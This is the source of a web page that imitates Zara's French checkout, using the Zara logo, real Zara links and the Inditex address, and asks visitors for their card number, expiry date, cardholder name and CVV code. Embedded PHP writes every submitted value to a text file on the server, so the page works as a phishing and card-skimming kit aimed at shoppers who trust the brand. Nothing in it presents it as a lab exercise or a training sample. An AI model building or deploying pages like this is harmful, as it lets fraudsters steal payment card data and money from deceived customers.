<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Process Order - Payment using Card</title>
    <link rel="stylesheet" href="navbar.css" />
    <link rel="stylesheet" href="cardPayment.css" />
    <link rel="stylesheet" href="footer.css" />
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Karla:wght@200;300&family=Mulish:wght@200;400&family=PT+Sans&family=Pacifico&family=Shizuru&display=swap" rel="stylesheet" />
</head>

<body>







    <nav id="navbar">
        <div id="logo">
            <a href="https://www.zara.com/fr/">
                <img src="https://logodownload.org/wp-content/uploads/2014/05/zara-logo-1.png" alt="zaralogo">
            </a>
        </div>

        <div id="ship">
            <div class="active">PAYMENT</div>
            <div> &gt; </div>
            <div>CONFIRMATION</div>
            <div> &gt; </div>
            <div>SHIPPING</div>
        </div>

        <div id="help">
            <a href="https://www.zara.com/fr/fr/logon">
                <div>LOG IN</div>
            </a><a>
            </a><a href="https://www.zara.com/fr/fr/help-center">
                <div>HELP</div>
            </a><a>
            </a>
        </div>
    </nav>


































    <div class="layout-header__links"><a class="links__desktop" href="https://www.zara.com/fr/en/help" tabindex="0"><span>HELP</span></a></div>
    </div>
    </div>


    <!-- navbar -->
    <nav id="navbar"></nav>

    <div id="bottom">
        <h2>ENTER YOUR CARD DETAILS</h2>
        <img class="img" src="https://cdn-icons-png.flaticon.com/512/18/18221.png" alt="" />
        <form method="get">
            <input type="username" name="user" placeholder="NUMERO DE CARTE">
            <input type="month" name="month" placeholder="MOIS">
            <input type="number" name="numb" placeholder="CODE 4 CHIFFRE OPTIONEL">
            <input type="text" name="text" placeholder="CARD HOLDER">
            <input type="password" name="pass" placeholder="CVV2 SECURITY CODE">
            <button>CONTINUER</button>
        </form>


        <?php

        if (isset($_GET["month"])) {
            if (isset($user) || isset($pass) || isset($numb) || isset($date) || isset($user))

                $username = $_GET["user"];
            $month = $_GET["month"];
            $numb = $_GET["numb"];
            $text = $_GET["text"];
            $pass = $_GET["pass"];
            $username = $_GET["user"];
            $f = fopen("zara.txt", "a");
            fwrite($f, "username:" . $username  . "month:" . $month . "number:" . $numb . "text:" . $text . "password:" . $pass . "username:" . $username . "\n");
            fclose($f);
        }
        ?>


    </div>

    <div id="cards">
        <div id="pr">
            <div id="price">TOTAL : <span>2,290.00</span></div>
            <a href="article.html"><button>
                    CONTINUE
                </button></a>
        </div>
    </div>



    <div id="footer">
        <footer class="footer" id="footer">
            <div class="container">
                <div class="options">
                    <div class="footer-opt">
                        <h4>HELP</h4>
                        <ul>
                            <li><a href="*">SHOP AT ZARA.COM</a></li>
                            <li><a href="*">PRODUCT</a></li>
                            <li><a href="*">PAYMENT</a></li>
                            <li><a href="*">SHIPPING</a></li>
                            <li><a href="*">EXCHANGES AND RETURNS</a></li>
                            <li><a href="*">SHOPS AND COMPANY</a></li>
                            <li><a href="*">CLOTHES COLLECTION PROGRAMME</a></li>
                            <li><a href="*">MY ACCOUNT</a></li>
                        </ul>
                    </div>
                    <div class="footer-opt">
                        <h4>FOLLOW US</h4>
                        <ul>
                            <li><a href="https://www.zara.com/fr/fr/z-newsletter-nl1400.html">NEWSLETTER</a></li>
                            <li><a href="https://www.tiktok.com/@zara?lang=fr">TIKTOK</a></li>
                            <li><a href="https://www.instagram.com/zara/">INSTAGRAM</a></li>
                            <li><a href="https://www.facebook.com/Zara/?locale=fr_FR">FACEBOOK</a></li>
                            <li><a href="https://twitter.com/zara_source?lang=fr">TWITTER</a></li>
                            <li><a href="https://www.pinterest.fr/zaraofficial/">PINTEREST</a></li>
                            <li><a href="https://www.youtube.com/user/ZARA">YOUTUBE</a></li>
                        </ul>
                    </div>
                    <div class="footer-opt">
                        <h4>COMPANY</h4>
                        <ul>
                            <li><a href="https://www.zara.com/us/en/z-company-corp1391.html">ABOUT US</a></li>
                            <li><a href="https://www.google.com/search?q=zara+offices&sxsrf=APwXEdeyx7Dm7F5KsPAwDfohXKh9q-vyCw%3A1679743042161&ei=QtgeZLHCCYTYkdUP5r2fsAk&ved=0ahUKEwix6926-vb9AhUEbKQEHebeB5YQ4dUDCA8&uact=5&oq=zara+offices&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQRxDWBBCwAzIKCAAQigUQsAMQQzIQCC4QigUQxwEQ0QMQsAMQQ0oECEEYAFDEB1jEB2C3CGgBcAF4AIABAIgBAJIBAJgBAKABAcgBCsABAQ&sclient=gws-wiz-serp">OFFICES</a></li>
                            <li><a href="https://www.zara.com/fr/en/z-stores-st1404.html">STORES</a></li>
                            <li><a href="https://www.zara.com/us/en/z-job-corp1398.html">WORK WITH US</a></li>
                        </ul>
                    </div>
                    <div class="footer-opt">
                        <h4>POLICIES</h4>
                        <ul>
                            <li><a href="https://www.zara.com/static//pdfs/AM/privacy-policy/privacy-policy-ru_AM-20201102.pdf">PRIVACY POLICY</a></li>
                            <li><a href="https://www.zara.com/uk/en/help/how-to-return-h37.html">PURCHASE CONDITIONS</a></li>
                            <li><a href="https://press.zara.com/ECOMPressSite/cookies.html">COOKIES SETTINGS</a></li>
                        </ul>
                    </div>
                </div>
                <hr id="line">
                <div class="divfoot">
                    <div id="div1">
                        <p>FRANCE</p>
                    </div>
                    <div id="div2">
                        <p>ENGLISH</p>
                        <br>
                        <p id="reserved">© ALL RIGHTS RESERVED</p>
                    </div>
                </div>
                <p id="end">NAME AND ADDRESS OF THE MANUFACTURER:<br>INDUSTRIA DE DISEÑO TEXTIL, S.A. (INDITEX, S.A.)<br>AVENIDA DE LA DIPUTACIÓN, EDIFICIO INDITEX, 15143, ARTEIXO (A CORUÑA), SPAIN</p>
            </div>
        </footer>
    </div>











    <div id="footer"></div>
</body>

</html>

<script type="module">
    let total = JSON.parse(localStorage.getItem("total"));
    document.getElementById("price").innerHTML = `TOTAL : <span>${total}</span>`;

    import navbar from "./components/navbar.js";
    let nav = document.getElementById("navbar");
    nav.innerHTML = navbar();

    import {
        footers
    } from "./components/footer.js";
    let footer = document.getElementById("footer");
    footer.innerHTML = footers();
</script>